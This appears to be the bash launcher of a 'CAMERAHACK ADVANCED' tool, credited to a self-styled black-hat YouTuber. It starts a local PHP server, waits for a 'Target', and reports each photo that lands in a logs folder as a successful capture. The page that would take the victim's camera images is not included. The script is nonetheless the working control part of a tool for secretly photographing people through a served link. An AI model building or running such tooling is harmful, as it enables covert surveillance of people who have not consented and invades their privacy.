

#!/bin/bash

# Colors
red='\e[91m'
green='\e[92m'
yellow='\e[93m'
cyan='\e[96m'
magenta='\e[95m'
reset='\e[0m'

# Clear screen and Show Banner
clear
echo -e "${red} ██████╗  █████╗ ███╗   ███╗███████╗██████╗  █████╗ ██╗  ██╗${reset}"
echo -e "${yellow}██╔════╝ ██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔══██╗╚██╗██╔╝${reset}"
echo -e "${green}██║      ███████║██╔████╔██║█████╗  ██████╔╝███████║ ╚███╔╝ ${reset}"
echo -e "${cyan}██║      ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗██╔══██║ ██╔██╗ ${reset}"
echo -e "${magenta}╚██████╗ ██║  ██║██║ ╚═╝ ██║███████╗██║  ██║██║  ██║██╔╝ ██╗${reset}"
echo -e "${red} ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝${reset}"
echo ""
echo -e "${cyan}----------------- CAMERAHACK ADVANCED -----------------${reset}"
echo -e "${green}  Created by: Priyanshu Gupta❤️${reset}"
echo -e "${yellow}  Subscribe: The Black Hat Priyanshu${reset}"
echo -e "${cyan}-------------------------------------------------------${reset}"
echo ""

# Dependencies Check
if ! command -v inotifywait >/dev/null 2>&1; then
    echo -e "${yellow}[!] Installing inotify-tools...${reset}"
    pkg install inotify-tools -y >/dev/null 2>&1
fi

# Start Server
echo -e "${yellow}[+] Starting PHP server on 127.0.0.1:8080...${reset}"
mkdir -p logs
killall php >/dev/null 2>&1
php -S 127.0.0.1:8080 >/dev/null 2>&1 &
sleep 2

echo -e "${cyan}[+] Local Link:${reset} ${green}http://127.0.0.1:8080${reset}"
echo -e "${red}[!] Press Ctrl+C to Exit${reset}"
echo ""

# Monitoring logs folder
echo -e "${magenta}[*] Waiting for Target...${reset}"
inotifywait -m -e create --format '%f' logs 2>/dev/null | while read file; do
    echo -e "${green}[+ SUCCESS] Photo Captured: logs/$file${reset}"
done
